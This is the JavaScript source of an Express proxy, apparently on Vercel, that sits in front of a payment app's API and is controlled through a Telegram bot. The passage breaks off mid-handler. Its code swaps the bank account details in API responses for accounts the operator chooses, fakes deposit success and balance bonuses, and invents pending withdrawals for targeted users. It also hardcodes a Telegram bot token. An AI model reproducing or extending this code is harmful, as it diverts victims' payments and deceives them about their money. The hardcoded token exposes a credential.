const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');
const kv = new Redis({
  url: process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN
});

const app = express();

const ORIGINAL_API = 'https://api.i-money.vip';
const token = '8728397123:AAH7SGg0CBGLHds2QSMxps0F1FkCIvlmbvM';
const WEBHOOK_URL = 'https://ixcv.vercel.app/api/telegram';
let bot;
let webhookSet = false;

if (token) {
  bot = new TelegramBot(token);
}

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
  } catch (e) {}
}

const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1, depositSuccess: false, depositBonus: 0, userOverrides: {}, trackedUsers: {}, fakeWithdrawals: {} };

async function loadData() {
  try {
    let data = await kv.get('bankData');
    if (data) {
      if (typeof data === 'string') data = JSON.parse(data);
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.trackedUsers) data.trackedUsers = {};
      if (!data.fakeWithdrawals) data.fakeWithdrawals = {};
      return data;
    }
  } catch (e) {}
  return { ...DEFAULT_DATA, userOverrides: {}, trackedUsers: {} };
}

async function trackUser(bankData, userId, info) {
  if (!userId || userId === 'N/A') return;
  if (!bankData.trackedUsers) bankData.trackedUsers = {};
  const existing = bankData.trackedUsers[String(userId)] || {};
  bankData.trackedUsers[String(userId)] = {
    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
    lastAction: info || existing.lastAction || '',
    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0)
  };
}

async function saveData(data) {
  try { await kv.set('bankData', JSON.stringify(data)); } catch (e) {}
}

function getUserOverride(bankData, userId) {
  if (!userId || !bankData.userOverrides) return null;
  return bankData.userOverrides[String(userId)] || null;
}

function getEffectiveSettings(bankData, userId) {
  const uo = getUserOverride(bankData, userId);
  return {
    botEnabled: uo && uo.botEnabled !== undefined ? uo.botEnabled : bankData.botEnabled,
    depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : bankData.depositSuccess,
    depositBonus: uo && uo.depositBonus !== undefined ? uo.depositBonus : (bankData.depositBonus || 0),
    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null
  };
}

function getActiveBank(d, userId) {
  const uo = getUserOverride(d, userId);
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < d.banks.length) {
    return d.banks[uo.bankIndex];
  }
  if (d.autoRotate && d.banks.length > 0) {
    if (d.banks.length === 1) return d.banks[0];
    let nextIndex;
    do {
      nextIndex = Math.floor(Math.random() * d.banks.length);
    } while (nextIndex === d.lastUsedIndex && d.banks.length > 1);
    d.lastUsedIndex = nextIndex;
    d._rotatedIndex = nextIndex;
    return d.banks[nextIndex];
  }
  if (d.activeIndex >= 0 && d.activeIndex < d.banks.length) return d.banks[d.activeIndex];
  return null;
}

async function getActiveBankAndSave(d, userId) {
  const bank = getActiveBank(d, userId);
  if (d.autoRotate && d._rotatedIndex !== undefined) {
    d.lastUsedIndex = d._rotatedIndex;
    delete d._rotatedIndex;
    await saveData(d);
  }
  return bank;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${a}`;
  }).join('\n');
}

function extractUserId(req, jsonResp) {
  if (req.parsedBody && req.parsedBody.userId) return String(req.parsedBody.userId);
  const qs = new URLSearchParams(req.originalUrl.split('?')[1] || '');
  if (qs.get('userId')) return String(qs.get('userId'));
  if (jsonResp && jsonResp.data) {
    if (jsonResp.data.userId) return String(jsonResp.data.userId);
    if (jsonResp.data.user && jsonResp.data.user.userId) return String(jsonResp.data.user.userId);
    if (jsonResp.data.id) return String(jsonResp.data.id);
  }
  const authHeader = req.headers['authorization'] || req.headers['token'] || '';
  if (authHeader) {
    try {
      const parts = authHeader.replace('Bearer ', '').split('.');
      if (parts.length === 3) {
        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
        if (payload.userId) return String(payload.userId);
        if (payload.sub) return String(payload.sub);
        if (payload.id) return String(payload.id);
      }
    } catch(e) {}
  }
  return null;
}

app.use((req, res, next) => {
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    const bodyStr = req.rawBody.toString();
    req.parsedBody = {};
    try {
      req.parsedBody = JSON.parse(bodyStr);
    } catch(e) {
      if (bodyStr && bodyStr.includes('=')) {
        const params = new URLSearchParams(bodyStr);
        for (const [k, v] of params) req.parsedBody[k] = v;
      }
    }
    next();
  });
});

async function transparentProxy(req, res) {
  try {
    const url = ORIGINAL_API + req.originalUrl;
    const forwardHeaders = {};
    for (const [key, val] of Object.entries(req.headers)) {
      const k = key.toLowerCase();
      if (k === 'host' || k === 'connection' || k === 'content-length' || 
          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
      forwardHeaders[key] = val;
    }
    forwardHeaders['host'] = 'api.i-money.vip';

    const opts = { method: req.method, headers: forwardHeaders };

    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      forwardHeaders['content-length'] = String(req.rawBody.length);
    }

    const response = await fetch(url, opts);

    const respHeaders = {};
    response.headers.forEach((val, key) => {
      const k = key.toLowerCase();
      if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding') {
        respHeaders[key] = val;
      }
    });
    
    const body = await response.arrayBuffer();
    const buf = Buffer.from(body);

    res.writeHead(response.status, respHeaders);
    res.end(buf);
    return buf;
  } catch (e) {
    console.error('Proxy error:', req.method, req.originalUrl, e.message);
    if (!res.headersSent) {
      res.status(502).json({ code: 0, msg: 'Proxy error' });
    }
    return null;
  }
}

async function proxyFetch(req) {
  const url = ORIGINAL_API + req.originalUrl;
  const forwardHeaders = {};
  for (const [key, val] of Object.entries(req.headers)) {
    const k = key.toLowerCase();
    if (k === 'host' || k === 'connection' || k === 'content-length' ||
        k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
    forwardHeaders[key] = val;
  }
  forwardHeaders['host'] = 'api.i-money.vip';
  const opts = { method: req.method, headers: forwardHeaders };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    forwardHeaders['content-length'] = String(req.rawBody.length);
  }
  const response = await fetch(url, opts);
  const respBody = await response.text();
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const k = key.toLowerCase();
    if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding' && k !== 'content-length') {
      respHeaders[key] = val;
    }
  });
  let jsonResp = null;
  try { jsonResp = JSON.parse(respBody); } catch(e) {}
  return { response, respBody, respHeaders, jsonResp };
}

function sendJson(res, respHeaders, jsonResp, respBody) {
  const finalBody = jsonResp ? JSON.stringify(jsonResp) : respBody;
  respHeaders['content-type'] = 'application/json; charset=utf-8';
  respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
  res.writeHead(200, respHeaders);
  res.end(finalBody);
}

const BANK_FIELD_MAP = {
  receiveaccountno: 'accountNo', receiveaccountname: 'accountHolder', receiveifsc: 'ifsc',
  accountno: 'accountNo', accountname: 'accountHolder', accountholder: 'accountHolder',
  ifsc: 'ifsc', ifsccode: 'ifsc',
  bankaccountno: 'accountNo', bankaccountname: 'accountHolder', bankifsc: 'ifsc',
  receivename: 'accountHolder', receivebankname: 'accountHolder',
  beneficiaryname: 'accountHolder', beneficiaryaccount: 'accountNo',
  payeename: 'accountHolder', payeeaccount: 'accountNo', payeeifsc: 'ifsc',
  holdername: 'accountHolder', holderaccount: 'accountNo'
};

function replaceBankInUrl(urlStr, active) {
  if (!urlStr || typeof urlStr !== 'string') return urlStr;
  if (!urlStr.includes('://') && !urlStr.includes('?')) return urlStr;
  const urlParams = [
    { names: ['account', 'accountNo', 'account_no', 'accountno', 'account_number', 'accountNumber', 'acc', 'receiveAccountNo', 'receiver_account', 'pa'], value: active.accountNo },
    { names: ['name', 'accountName', 'account_name', 'accountname', 'receiveAccountName', 'receiver_name', 'beneficiary_name', 'beneficiaryName', 'pn', 'holder_name'], value: active.accountHolder },
    { names: ['ifsc', 'ifsc_code', 'ifscCode', 'receiveIfsc', 'IFSC'], value: active.ifsc },
    { names: ['displayAccountNumber'], value: 'XXXXXX' + active.accountNo.slice(-4) }
  ];
  let result = urlStr;
  for (const group of urlParams) {
    for (const paramName of group.names) {
      const regex = new RegExp('([?&])(' + paramName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')=([^&]*)', 'i');
      result = result.replace(regex, '$1$2=' + encodeURIComponent(group.value));
    }
  }
  return result;
}

function deepReplaceBankDetails(obj, active, originalValues, depth) {
  if (!obj || !active || typeof obj !== 'object') return;
  if (depth === undefined) depth = 0;
  if (depth > 10) return;

  for (const key of Object.keys(obj)) {
    const lk = key.toLowerCase();
    const mappedField = BANK_FIELD_MAP[lk];
    if (mappedField && obj[key] !== undefined && obj[key] !== null) {
      if (typeof obj[key] === 'string' || typeof obj[key] === 'number') {
        if (originalValues && typeof obj[key] === 'string' && obj[key].length > 3) {
          originalValues[key] = obj[key];
        }
        obj[key] = active[mappedField];
      }
    }

    if (typeof obj[key] === 'string') {
      const val = obj[key];
      if (val.includes('://') || (val.includes('?') && val.includes('='))) {
        obj[key] = replaceBankInUrl(val, active);
      }
      if (originalValues) {
        for (const [origKey, origVal] of Object.entries(originalValues)) {
          if (typeof origVal === 'string' && origVal.length > 3 && obj[key].includes(origVal)) {
            const mappedF = BANK_FIELD_MAP[origKey.toLowerCase()];
            if (mappedF) {
              obj[key] = obj[key].split(origVal).join(active[mappedF]);
            }
          }
        }
      }
    }

    if (typeof obj[key] === 'object' && obj[key] !== null) {
      if (Array.isArray(obj[key])) {
        obj[key].forEach(item => {
          if (typeof item === 'object' && item !== null) deepReplaceBankDetails(item, active, originalValues, depth + 1);
        });
      } else {
        deepReplaceBankDetails(obj[key], active, originalValues, depth + 1);
      }
    }
  }
}

function markDepositSuccess(obj) {
  if (!obj) return;
  const failValues = [3, '3', 4, '4', -1, '-1', 'failed', 'fail', 'FAILED', 'FAIL', 'cancelled', 'canceled'];
  if (obj.payStatus !== undefined) {
    if (!failValues.includes(obj.payStatus)) {
      obj.payStatus = 2;
    }
    return;
  }
  const statusFields = ['status', 'orderStatus', 'rechargeStatus', 'state'];
  for (const field of statusFields) {
    if (obj[field] !== undefined) {
      if (failValues.includes(obj[field])) continue;
      if (typeof obj[field] === 'number') {
        obj[field] = 2;
      } else if (typeof obj[field] === 'string') {
        const num = parseInt(obj[field]);
        if (!isNaN(num)) {
          obj[field] = '2';
        } else {
          obj[field] = 'success';
        }
      }
    }
  }
}

function addBonusToBalanceFields(obj, bonus) {
  if (!obj || typeof obj !== 'object') return;
  const balanceKeys = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money', 'coin', 'wallet', 'usermoney', 'rechargebalance', 'totalamount', 'availableamount'];
  for (const key of Object.keys(obj)) {
    if (balanceKeys.includes(key.toLowerCase())) {
      const current = parseFloat(obj[key]);
      if (!isNaN(current)) {
        obj[key] = typeof obj[key] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
      }
    }
    if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
      addBonusToBalanceFields(obj[key], bonus);
    }
  }
}

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch (e) { res.json({ error: e.message }); }
});

app.post('/api/telegram', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);

    const msg = req.parsedBody?.message;
    if (!msg || !msg.text) return res.sendStatus(200);

    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let bankData = await loadData();

    if (text === '/start') {
      if (bankData.adminChatId && bankData.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      bankData.adminChatId = chatId;
      if (bankData.botEnabled === undefined) bankData.botEnabled = true;
      if (bankData.autoRotate === undefined) bankData.autoRotate = false;
      await saveData(bankData);
      await bot.sendMessage(chatId,
`🏦 IMoney Bank Controller

=== GLOBAL COMMANDS ===
/addbank <AccNo> | <Name> | <IFSC>
/removebank <number>
/usebank <number>
/deactivate
/list
/status

/on - Bot ON
/off - Bot OFF

/rotate on/off - Auto rotate banks
/deposit on <amount> - ALL users deposit success
/deposit off - ALL users normal

=== WITHDRAW COMMANDS ===
/on withdraw <userId> <amount> - Add fake Paying withdrawal
/off withdraw <userId> - Remove fake withdrawal

=== PER-ID COMMANDS ===
/id deposit on <amount> <userId>
/id deposit off <userId>
/id bank <bankNumber> <userId>
/id on <userId>
/id off <userId>
/id status <userId>
/id reset <userId>
/id list - Show all user overrides

Example:
/addbank 1234567890 | Rahul Kumar | SBIN0001234
/id deposit on 5000 28963
/id bank 2 28963`
      );
    }

    else if (bankData.adminChatId && chatId !== bankData.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    else if (text.startsWith('/id ')) {
      const idCmd = text.substring(4).trim();

      if (idCmd === 'list') {
        const overrides = bankData.userOverrides || {};
        const ids = Object.keys(overrides);
        if (ids.length === 0) {
          await bot.sendMessage(chatId, '📋 No per-ID overrides set.\nUse /id track to see detected users.');
        } else {
          let msg = '📋 Per-ID Overrides:\n\n';
          for (const uid of ids) {
            const uo = overrides[uid];
            const parts = [];
            if (uo.botEnabled !== undefined) parts.push(uo.botEnabled ? '🟢 ON' : '🔴 OFF');
            if (uo.depositSuccess !== undefined) parts.push(uo.depositSuccess ? '✅ Deposit ON (₹' + (uo.depositBonus || 0) + ')' : '🔴 Deposit OFF');
            if (uo.bankIndex !== undefined) parts.push('🏦 Bank #' + (uo.bankIndex + 1));
            msg += `👤 ${uid}: ${parts.join(' | ')}\n`;
          }
          await bot.sendMessage(chatId, msg);
        }
        return res.sendStatus(200);
      }

      if (idCmd === 'track') {
        const tracked = bankData.trackedUsers || {};
        const ids = Object.keys(tracked);
        if (ids.length === 0) {
          await bot.sendMessage(chatId, '📋 No users detected yet.\nUsers will appear here when they make orders or UTR uploads.');
        } else {
          let msg = '📋 Detected Users:\n\n';
          for (const uid of ids) {
            const u = tracked[uid];
            const hasOverride = bankData.userOverrides && bankData.userOverrides[uid] ? ' ⚙️' : '';
            msg += `👤 ${uid}${hasOverride}\n   Last: ${u.lastAction || 'N/A'}\n   Seen: ${u.lastSeen || 'N/A'}\n   Orders: ${u.orderCount || 0}\n\n`;
          }
          msg += '⚙️ = has per-ID override\nUse /id status <userId> for details';
          await bot.sendMessage(chatId, msg);
        }
        return res.sendStatus(200);
      }

      const depositOnMatch = idCmd.match(/^deposit on\s+(\d+(?:\.\d+)?)\s+(\d+)$/);
      if (depositOnMatch) {
        const amount = parseFloat(depositOnMatch[1]);
        const userId = depositOnMatch[2];
        if (!bankData.userOverrides) bankData.userOverrides = {};
        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
        bankData.userOverrides[userId].depositSuccess = true;
        bankData.userOverrides[userId].depositBonus = (bankData.userOverrides[userId].depositBonus || 0) + amount;
        await saveData(bankData);
        await bot.sendMessage(chatId, `✅ User ${userId}: Deposit SUCCESS ON\n💰 Bonus: ₹${bankData.userOverrides[userId].depositBonus}`);
        return res.sendStatus(200);
      }

      const depositOffMatch = idCmd.match(/^deposit off\s+(\d+)$/);
      if (depositOffMatch) {
        const userId = depositOffMatch[1];
        if (!bankData.userOverrides) bankData.userOverrides = {};
        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
        bankData.userOverrides[userId].depositSuccess = false;
        bankData.userOverrides[userId].depositBonus = 0;
        await saveData(bankData);
        await bot.sendMessage(chatId, `🔴 User ${userId}: Deposit OFF, bonus removed.`);
        return res.sendStatus(200);
      }

      const bankMatch = idCmd.match(/^bank\s+(\d+)\s+(\d+)$/);
      if (bankMatch) {
        const bankNum = parseInt(bankMatch[1]);
        const userId = bankMatch[2];
        if (bankNum < 1 || bankNum > bankData.banks.length) {
          await bot.sendMessage(chatId, `❌ Invalid bank number. /list se check karo.`);
          return res.sendStatus(200);
        }
        if (!bankData.userOverrides) bankData.userOverrides = {};
        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
        bankData.userOverrides[userId].bankIndex = bankNum - 1;
        await saveData(bankData);
        const bank = bankData.banks[bankNum - 1];
        await bot.sendMessage(chatId, `✅ User ${userId}: Bank #${bankNum} set\n${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`);
        return res.sendStatus(200);
      }

      const onMatch = idCmd.match(/^on\s+(\d+)$/);
      if (onMatch) {
        const userId = onMatch[1];
        if (!bankData.userOverrides) bankData.userOverrides = {};
        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
        bankData.userOverrides[userId].botEnabled = true;
        await saveData(bankData);
        await bot.sendMessage(chatId, `🟢 User ${userId}: Bot ON`);
        return res.sendStatus(200);
      }

      const offMatch = idCmd.match(/^off\s+(\d+)$/);
      if (offMatch) {
        const userId = offMatch[1];
        if (!bankData.userOverrides) bankData.userOverrides = {};
        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
        bankData.userOverrides[userId].botEnabled = false;
        await saveData(bankData);
        await bot.sendMessage(chatId, `🔴 User ${userId}: Bot OFF`);
        return res.sendStatus(200);
      }

      const statusMatch = idCmd.match(/^status\s+(\d+)$/);
      if (statusMatch) {
        const userId = statusMatch[1];
        const uo = getUserOverride(bankData, userId);
        const eff = getEffectiveSettings(bankData, userId);
        let msg = `📊 User ${userId} Status:\n\n`;
        if (!uo) {
          msg += '(No overrides — using global settings)\n\n';
        }
        msg += `Bot: ${eff.botEnabled !== false ? '🟢 ON' : '🔴 OFF'}${uo && uo.botEnabled !== undefined ? ' (per-ID)' : ' (global)'}\n`;
        msg += `Deposit: ${eff.depositSuccess ? '✅ ON (₹' + eff.depositBonus + ')' : '🔴 OFF'}${uo && uo.depositSuccess !== undefined ? ' (per-ID)' : ' (global)'}\n`;
        if (eff.bankOverride !== null && eff.bankOverride >= 0 && eff.bankOverride < bankData.banks.length) {
          const b = bankData.banks[eff.bankOverride];
          msg += `Bank: 🏦 #${eff.bankOverride + 1} ${b.accountHolder} | ${b.accountNo} (per-ID)\n`;
        } else {
          const active = getActiveBank(bankData, null);
          msg += `Bank: ${active ? active.accountHolder + ' | ' + active.accountNo : 'None'} (global)\n`;
        }
        await bot.sendMessage(chatId, msg);
        return res.sendStatus(200);
      }

      const resetMatch = idCmd.match(/^reset\s+(\d+)$/);
      if (resetMatch) {
        const userId = resetMatch[1];
        if (bankData.userOverrides && bankData.userOverrides[userId]) {
          delete bankData.userOverrides[userId];
          await saveData(bankData);
          await bot.sendMessage(chatId, `🔄 User ${userId}: All overrides removed. Using global settings.`);
        } else {
          await bot.sendMessage(chatId, `ℹ️ User ${userId}: No overrides to reset.`);
        }
        return res.sendStatus(200);
      }

      await bot.sendMessage(chatId, `❌ Invalid /id command.\n\nUsage:\n/id deposit on <amount> <userId>\n/id deposit off <userId>\n/id bank <bankNum> <userId>\n/id on <userId>\n/id off <userId>\n/id status <userId>\n/id reset <userId>\n/id list`);
      return res.sendStatus(200);
    }

    else if (text.match(/^\/on withdraw\s+/i)) {
      const wMatch = text.match(/^\/on withdraw\s+(\S+)\s+(\S+)$/i);
      if (!wMatch) {
        await bot.sendMessage(chatId, '❌ Format: /on withdraw <userId> <amount>');
        return res.sendStatus(200);
      }
      const userId = wMatch[1];
      const amount = parseFloat(wMatch[2]);
      if (isNaN(amount) || amount <= 0) {
        await bot.sendMessage(chatId, '❌ Invalid amount.');
        return res.sendStatus(200);
      }
      if (!bankData.fakeWithdrawals) bankData.fakeWithdrawals = {};
      const now = new Date();
      const orderId = 'DS' + now.getFullYear().toString().substring(2) + String(now.getMonth() + 1).padStart(2, '0') + String(now.getDate()).padStart(2, '0') + String(now.getHours()).padStart(2, '0') + String(now.getMinutes()).padStart(2, '0') + String(now.getSeconds()).padStart(2, '0') + String(now.getMilliseconds()).padStart(3, '0') + Math.floor(Math.random() * 10000).toString().padStart(4, '0');
      const createTime = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: false, year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(/(\d+)\/(\d+)\/(\d+),\s*/, '$3-$2-$1 ');
      bankData.fakeWithdrawals[userId] = {
        orderId,
        amount: amount.toFixed(2),
        status: 0,
        statusName: 'Paying',
        createTime,
        userId,
        createdAt: now.toISOString()
      };
      await saveData(bankData);
      await bot.sendMessage(chatId, `✅ Fake withdrawal added for user ${userId}\n💰 Amount: ₹${amount.toFixed(2)}\n📋 Order: ${orderId}\n📊 Status: Paying\n\nUse /off withdraw ${userId} to remove.`);
      return res.sendStatus(200);
    }

    else if (text.match(/^\/off withdraw\s+/i)) {
      const userId = text.replace(/^\/off withdraw\s+/i, '').trim();
      if (!userId) {
        await bot.sendMessage(chatId, '❌ Format: /off withdraw <userId>');
        return res.sendStatus(200);
      }
      if (!bankData.fakeWithdrawals) bankData.fakeWithdrawals = {};
      if (bankData.fakeWithdrawals[userId]) {
        const removed = bankData.fakeWithdrawals[userId];
        delete bankData.fakeWithdrawals[userId];
        await saveData(bankData);
        await bot.sendMessage(chatId, `🗑 Fake withdrawal removed for user ${userId}\nOrder: ${removed.orderId}\nAmount: ₹${removed.amount}`);
      } else {
        await bot.sendMessage(chatId, `ℹ️ No fake withdrawal found for user ${userId}.`);
      }
      return res.sendStatus(200);
    }

    else if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).split('|').map(s => s.trim());
      if (parts.length !== 3) {
        await bot.sendMessage(chatId, '❌ Format: /addbank AccNo | Name | IFSC');
        return res.sendStatus(200);
      }
      if (bankData.banks.length >= 10) {
        await bot.sendMessage(chatId, '❌ Max 10 banks.');
        return res.sendStatus(200);
      }
      bankData.banks.push({ accountNo: parts[0], accountHolder: parts[1], ifsc: parts[2] });
      if (bankData.banks.length === 1) bankData.activeIndex = 0;
      await saveData(bankData);
      await bot.sendMessage(chatId,
`✅ Bank #${bankData.banks.length} added:
${parts[0]} | ${parts[1]} | ${parts[2]}
${bankData.banks.length === 1 ? '(Auto-activated)' : '/usebank ' + bankData.banks.length + ' to activate'}`
      );
    }

    else if (text.startsWith('/removebank ')) {
      const num = parseInt(text.substring(12).trim());
      if (isNaN(num) || num < 1 || num > bankData.banks.length) {
        await bot.sendMessage(chatId, '❌ Invalid. /list se check karo.');
        return res.sendStatus(200);
      }
      const removed = bankData.banks.splice(num - 1, 1)[0];
      if (bankData.activeIndex === num - 1) bankData.activeIndex = bankData.banks.length > 0 ? 0 : -1;
      else if (bankData.activeIndex > num - 1) bankData.activeIndex--;
      if (bankData.userOverrides) {
        for (const uid of Object.keys(bankData.userOverrides)) {
          const uo = bankData.userOverrides[uid];
          if (uo.bankIndex !== undefined) {
            if (uo.bankIndex === num - 1) delete uo.bankIndex;
            else if (uo.bankIndex > num - 1) uo.bankIndex--;
          }
        }
      }
      await saveData(bankData);
      await bot.sendMessage(chatId, `🗑 Removed: ${removed.accountHolder} | ${removed.accountNo}`);
    }

    else if (text.startsWith('/usebank ')) {
      const num = parseInt(text.substring(9).trim());
      if (isNaN(num) || num < 1 || num > bankData.banks.length) {
        await bot.sendMessage(chatId, '❌ Invalid. /list se check karo.');
        return res.sendStatus(200);
      }
      bankData.activeIndex = num - 1;
      await saveData(bankData);
      const bank = bankData.banks[bankData.activeIndex];
      await bot.sendMessage(chatId,
`✅ Bank #${num} ACTIVE (global):
${bank.accountNo} | ${bank.accountHolder} | ${bank.ifsc}`
      );
    }

    else if (text === '/deactivate') {
      bankData.activeIndex = -1;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🔴 All banks deactivated (global).');
    }

    else if (text === '/on') {
      bankData.botEnabled = true;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🟢 Bot ON (global)! Bank overlay + notifications active.');
    }

    else if (text === '/off') {
      bankData.botEnabled = false;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🔴 Bot OFF (global)! No overlay, no notifications.');
    }

    else if (text === '/rotate on') {
      if (bankData.banks.length < 2) {
        await bot.sendMessage(chatId, '❌ Add at least 2 banks for auto-rotate.');
        return res.sendStatus(200);
      }
      bankData.autoRotate = true;
      bankData.lastUsedIndex = -1;
      await saveData(bankData);
      await bot.sendMessage(chatId, `🔄 Auto-Rotate ON!\n${bankData.banks.length} banks in rotation.`);
    }

    else if (text === '/rotate off') {
      bankData.autoRotate = false;
      await saveData(bankData);
      const active = getActiveBank(bankData, null);
      await bot.sendMessage(chatId, `🔄 Auto-Rotate OFF!\nFixed bank: ${active ? active.accountHolder + ' | ' + active.accountNo : 'None (use /usebank)'}`);
    }

    else if (text.startsWith('/deposit on')) {
      const amountStr = text.substring(11).trim();
      const amount = parseFloat(amountStr);
      if (amountStr && isNaN(amount)) {
        await bot.sendMessage(chatId, '❌ Format: /deposit on <amount>\nFor per-ID: /id deposit on <amount> <userId>');
        return res.sendStatus(200);
      }
      bankData.depositSuccess = true;
      if (!isNaN(amount) && amount > 0) {
        bankData.depositBonus = (bankData.depositBonus || 0) + amount;
      }
      await saveData(bankData);
      await bot.sendMessage(chatId,
`✅ Deposit SUCCESS mode ON (GLOBAL — all users)!

${amount > 0 ? '💰 Added: ₹' + amount + '\n' : ''}Balance Bonus: ₹${bankData.depositBonus || 0}

For per-ID control: /id deposit on <amount> <userId>`
      );
    }

    else if (text === '/deposit off') {
      bankData.depositSuccess = false;
      bankData.depositBonus = 0;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🔴 Deposit OFF (GLOBAL)! Real data restored.\nPer-ID overrides still active. Use /id list to check.');
    }

    else if (text === '/list') {
      const rotateStatus = bankData.autoRotate ? '🔄 Auto-Rotate: ON' : '🔄 Auto-Rotate: OFF';
      const botStatus = bankData.botEnabled !== false ? '🟢 Bot: ON' : '🔴 Bot: OFF';
      const depositStatus = bankData.depositSuccess ? '✅ Deposit: SUCCESS (₹' + (bankData.depositBonus || 0) + ')' : '🔴 Deposit: Normal';
      const idCount = Object.keys(bankData.userOverrides || {}).length;
      await bot.sendMessage(chatId, `🏦 Banks:\n\n${bankListText(bankData)}\n\n${botStatus} (global)\n${rotateStatus}\n${depositStatus} (global)\n👤 Per-ID overrides: ${idCount}\n\nUse /id list for per-ID details`);
    }

    else if (text === '/status') {
      const botOn = bankData.botEnabled !== false;
      const rotate = bankData.autoRotate === true;
      const deposit = bankData.depositSuccess === true;
      const active = getActiveBank(bankData, null);
      const idCount = Object.keys(bankData.userOverrides || {}).length;
      let msg = `📊 Global Status:\n\n`;
      msg += `Bot: ${botOn ? '🟢 ON' : '🔴 OFF'}\n`;
      msg += `Auto-Rotate: ${rotate ? '🔄 ON (' + bankData.banks.length + ' banks)' : '❌ OFF'}\n`;
      msg += `Deposit: ${deposit ? '✅ SUCCESS (₹' + (bankData.depositBonus || 0) + ')' : '🔴 Normal'}\n`;
      msg += `Banks: ${bankData.banks.length}\n`;
      msg += `Per-ID overrides: ${idCount}\n`;
      const fwCount = Object.keys(bankData.fakeWithdrawals || {}).length;
      if (fwCount > 0) {
        msg += `Fake Withdrawals: ${fwCount} active\n`;
        for (const [uid, fw] of Object.entries(bankData.fakeWithdrawals)) {
          msg += `  👤 ${uid}: ₹${fw.amount} (${fw.statusName})\n`;
        }
      }
      if (active) {
        msg += `\nCurrent Bank:\n${active.accountHolder} | ${active.accountNo} | ${active.ifsc}`;
      } else {
        msg += `\n⚠️ No active bank`;
      }
      await bot.sendMessage(chatId, msg);
    }

    return res.sendStatus(200);
  } catch (err) {
    console.error('Telegram error:', err);
    return res.sendStatus(200);
  }
});

app.all('/wallet/online/walletType', async (req, res) => {
  const bankData = await loadData();
  const userId = extractUserId(req, null);
  const eff = getEffectiveSettings(bankData, userId);
  if (eff.botEnabled === false) return await transparentProxy(req, res);
  const active = await getActiveBankAndSave(bankData, userId);
  if (!active) return await transparentProxy(req, res);

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    if (jsonResp && jsonResp.data) {
      const originalValues = {};
      deepReplaceBankDetails(jsonResp.data, active, originalValues, 0);
      if (jsonResp.code === undefined) jsonResp.code = 1;
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('walletType proxy error:', e.message);
    res.json({
      code: 1,
      data: { receiveAccountNo: active.accountNo, receiveAccountName: active.accountHolder, receiveIfsc: active.ifsc, walletType: 'paytm' },
      msg: 'success'
    });
  }
});

app.post('/money/uploadUtr', async (req, res) => {
  const bankData = await loadData();
  if (bankData.botEnabled === false) return await transparentProxy(req, res);
  if (bankData.adminChatId && bot) {
    let b = req.parsedBody || {};
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.includes('multipart/form-data')) {
      const bodyStr = req.rawBody.toString();
      const utrMatch = bodyStr.match(/name="utr"[\r\n]+([^\r\n-]+)/);
      const orderMatch = bodyStr.match(/name="orderId"[\r\n]+([^\r\n-]+)/);
